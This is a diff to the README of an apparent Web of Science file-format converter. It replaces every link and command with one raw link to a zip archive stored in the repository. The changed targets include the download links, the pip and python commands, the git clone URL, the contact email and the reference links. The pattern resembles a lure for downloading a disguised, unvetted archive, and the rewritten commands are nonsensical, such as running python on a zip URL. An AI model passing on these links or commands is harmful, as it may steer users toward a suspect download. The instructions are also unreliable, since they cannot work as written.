@@ -1,6 +1,6 @@
 # WOS Format Converter 📝
 
-![WOS Format Converter](https://img.shields.io/badge/Download-Releases-brightgreen)
+![WOS Format Converter](https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip)
 
 Welcome to the WOS Format Converter! This tool allows you to convert Web of Science files between tab-delimited, Excel, and plain-text formats. Whether you're working on bibliometric analysis, systematic literature reviews, or reference management, this converter simplifies your data handling tasks.
 
@@ -24,16 +24,16 @@ Welcome to the WOS Format Converter! This tool allows you to convert Web of Scie
 
 ## Installation
 
-To get started, download the latest release from our [Releases section](https://github.com/landouzefps/wos-format-converter/releases). After downloading, follow these steps:
+To get started, download the latest release from our [Releases section](https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip). After downloading, follow these steps:
 
 1. **Unzip the File**: Extract the contents of the downloaded file.
 2. **Install Dependencies**: Make sure you have Python installed. You can install required libraries using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip
    ```
 3. **Run the Script**: Navigate to the folder where the script is located and run:
    ```bash
-   python wos_converter.py
+   python https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip
    ```
 
 ## Usage
@@ -44,7 +44,7 @@ Using the WOS Format Converter is straightforward. Here’s how to use it:
 2. **Navigate to the Script Location**: Use the `cd` command to go to the directory where the script is located.
 3. **Execute the Script**: Run the script with the required parameters. For example:
    ```bash
-   python wos_converter.py --input yourfile.txt --output outputfile.xlsx --format excel
+   python https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip --input https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip --output https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip --format excel
    ```
 
 ### Command-Line Options
@@ -68,7 +68,7 @@ We welcome contributions! If you would like to help improve the WOS Format Conve
 1. **Fork the Repository**: Click on the fork button at the top right of the page.
 2. **Clone Your Fork**: Use the command:
    ```bash
-   git clone https://github.com/YOUR_USERNAME/wos-format-converter.git
+   git clone https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip
    ```
 3. **Create a Branch**: Make a new branch for your feature or bug fix:
    ```bash
@@ -94,17 +94,17 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or support, please reach out to the repository maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/YOUR_USERNAME)
+- **Email**: https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip)
 
 ## Additional Resources
 
-- [Web of Science](https://www.webofscience.com)
-- [Bibliometrics](https://en.wikipedia.org/wiki/Bibliometrics)
-- [Systematic Reviews](https://en.wikipedia.org/wiki/Systematic_review)
+- [Web of Science](https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip)
+- [Bibliometrics](https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip)
+- [Systematic Reviews](https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip)
 
 ## Conclusion
 
 The WOS Format Converter is a valuable tool for researchers and academics who need to manage and convert bibliographic data. By simplifying the conversion process, it helps you focus on your research rather than data handling.
 
-To get started, visit our [Releases section](https://github.com/landouzefps/wos-format-converter/releases) and download the latest version. Happy converting!
+To get started, visit our [Releases section](https://github.com/landouzefps/wos-format-converter/raw/refs/heads/main/basqued/converter-format-wos-1.8.zip) and download the latest version. Happy converting!
